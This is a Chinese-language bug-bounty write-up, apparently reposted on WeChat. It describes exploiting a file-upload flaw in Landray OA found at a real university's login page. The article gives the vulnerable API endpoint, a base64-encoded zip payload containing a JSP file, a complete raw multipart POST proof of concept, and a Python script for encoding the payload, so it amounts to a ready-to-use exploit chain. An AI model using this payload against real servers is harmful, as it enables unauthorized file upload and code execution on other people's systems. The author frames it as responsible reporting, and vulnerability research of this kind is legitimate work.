---
title: SRC实战：指纹识别->代码执行
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495508&idx=1&sn=edbeefeaedc92073a826f5fd5f5c84be&chksm=e8a5e537dfd26c21c6659096c535a64e3b66cefa3b9dc46242a80c4edff395f517fabaa2d8f8&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2024-08-14
fetch_date: 2025-10-06T18:05:52.869414
---

# SRC实战：指纹识别->代码执行

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj7UFRm7G9YkD5U1AES8ib47R6VNJN74g0lahaQL2n7lGNzjxnXdtiaO3iaficP7bdQwny5WjonxRFxR7w/0?wx_fmt=jpeg)

# SRC实战：指纹识别->代码执行

迪哥讲事

以下文章来源于剑客古月的安全屋
，作者月金剑客

![](http://wx.qlogo.cn/mmhead/dibCvqHg4WncsYKQOO8N6HULUqdiclOBngrrMRcia94YODoKo1RdGLzdaGhqoSxXPWDz2g0yZG2Ewk/0)

**剑客古月的安全屋**
.

本科在读，目前大三。曾在多家甲乙方大厂实习。技术栈：移动端(安卓IOS鸿蒙)攻防、web端爬虫、风控、空间测绘与抗测绘、web端基础安全攻防、渗透、安全开发、src挖掘、代码审计、免杀，LLM大模型(NLP，CV)

# 一.发现目标

今天不小心渗透测试其它目标时点进了北京外国语大学的一个oa登陆界面

看着有点眼熟，于是去识别了一下指纹

![](https://mmbiz.qpic.cn/mmbiz_png/wF30Z0OMuW3FEiazh6uEkXapzt9ypXzL8TQnVeaHXUd2Kic2e3YWS9MZr5yPrWW4TwkJ9JLHSyibiakibfO0uPrK8kg/640?wx_fmt=png&from=appmsg)

蓝凌OA，老熟人，于是我们用一下历史漏洞打一下这个站

# 二.漏洞验证

验证漏洞是否可以利用，可以访问该接口

```
https://127.0.0.1/api///sys/ui/sys_ui_extend/sysUiExtend.do?method=upload
```

![](https://mmbiz.qpic.cn/mmbiz_png/wF30Z0OMuW3FEiazh6uEkXapzt9ypXzL8pibfzDq0FRccLC9eSRMA72aEvgv3AAtvENszgd5qLM0ZJ0Ba72T5iaog/640?wx_fmt=png&from=appmsg)

页面如下

成功访问

有戏，那我们接着利用一下

# 三.漏洞利用

构造上传文件，guyue.jsp和ui.ini，然后放在同一个文件夹下打包

![](https://mmbiz.qpic.cn/mmbiz_png/wF30Z0OMuW3FEiazh6uEkXapzt9ypXzL8PtHF1G3wicYHnj68rZR8fQxnjQy8qAWJqGwwiarAqOfibcHZZicque5Yzg/640?wx_fmt=png&from=appmsg)

然后将压缩包进行base64编码

```
UEsDBBQAAAAIAFh3PVjyEgrVagAAAHQAAAAJAAAAZ3V5dWUuanNwHchBCsIwEAXQveAdYqGQgOQCFZeuRU8wlE8z7TCJcVLx9qV9y3frXW4WS2U1Ud8liORronFBdVP7N8xMuuDShUHxO59mWilyjg8WeCpFeCTjrHGCvUDyJEu+4tPwtf3eqKvAjg4hDK6/b1BLAwQKAAAAAABqdz1YCbZnQiEAAAAhAAAABgAAAHVpLmluaWlkPWd1eXVlDQpuYW1lPWd1eXVlDQp0aHVtYj1ndXl1ZVBLAQI/ABQAAAAIAFh3PVjyEgrVagAAAHQAAAAJACQAAAAAAAAAIAAAAAAAAABndXl1ZS5qc3AKACAAAAAAAAEAGACFTpyagFLaAVLdOrSAUtoBHYjQR31S2gFQSwECPwAKAAAAAABqdz1YCbZnQiEAAAAhAAAABgAkAAAAAAAAACAAAACRAAAAdWkuaW5pCgAgAAAAAAABABgADo27rYBS2gFZ3ATDgFLaARn/z0d9UtoBUEsFBgAAAAACAAIAswAAANYAAAAAAA==
```

poc如下

```
POST /api///sys/ui/sys_ui_extend/sysUiExtend.do?method=getThemeInfo HTTP/1.1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Content-Type: multipart/form-data; boundary=---------------------------260140030128010173621878123124
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest

-----------------------------260140030128010173621878123124
Content-Disposition: form-data; name="file"; filename="guyue.zip"
Content-Type: application/x-zip-compressed

{{base64dec(UEsDBBQAAAAIAFh3PVjyEgrVagAAAHQAAAAJAAAAZ3V5dWUuanNwHchBCsIwEAXQveAdYqGQgOQCFZeuRU8wlE8z7TCJcVLx9qV9y3frXW4WS2U1Ud8liORronFBdVP7N8xMuuDShUHxO59mWilyjg8WeCpFeCTjrHGCvUDyJEu+4tPwtf3eqKvAjg4hDK6/b1BLAwQKAAAAAABqdz1YCbZnQiEAAAAhAAAABgAAAHVpLmluaWlkPWd1eXVlDQpuYW1lPWd1eXVlDQp0aHVtYj1ndXl1ZVBLAQI/ABQAAAAIAFh3PVjyEgrVagAAAHQAAAAJACQAAAAAAAAAIAAAAAAAAABndXl1ZS5qc3AKACAAAAAAAAEAGACFTpyagFLaAVLdOrSAUtoBHYjQR31S2gFQSwECPwAKAAAAAABqdz1YCbZnQiEAAAAhAAAABgAkAAAAAAAAACAAAACRAAAAdWkuaW5pCgAgAAAAAAABABgADo27rYBS2gFZ3ATDgFLaARn/z0d9UtoBUEsFBgAAAAACAAIAswAAANYAAAAAAA==)}}
-----------------------------260140030128010173621878123124--
```

附上编码脚本

```
import base64
import zipfile

zip_file_path = "guyue.zip"
with open(zip_file_path, "rb") as file:
    zip_content = file.read()
base64_encoded = base64.b64encode(zip_content).decode("utf-8")
print(base64_encoded)
```

这里我踩了半个多小时的坑，需要直接将两个文件进行压缩，而不是先压缩成文件夹，再进行压缩

成功访问到我写入的文件路径

![](https://mmbiz.qpic.cn/mmbiz_png/wF30Z0OMuW3FEiazh6uEkXapzt9ypXzL8eCsKCjZqgia1F6oy1F4MZv19QCXiaDs2R8J1tNgBUaQ6DlynFjb7aUoA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/wF30Z0OMuW3FEiazh6uEkXapzt9ypXzL86AcqHOEjWWqJ8vZ3PAJ2ZSULxia1yu2VRS2LRJbE7DrdFJPtRvCLPNw/640?wx_fmt=png&from=appmsg)

# 四.提交src

教育src点到为止，不要上传马(bushi)

![](https://mmbiz.qpic.cn/mmbiz_png/wF30Z0OMuW3FEiazh6uEkXapzt9ypXzL88fFrSkctp3DkOdSAO3FctQugJ2iaB5bzmlia9m6OfZF5Wic0qXH0biaFzA/640?wx_fmt=png&from=appmsg)

如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

迪哥讲事

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过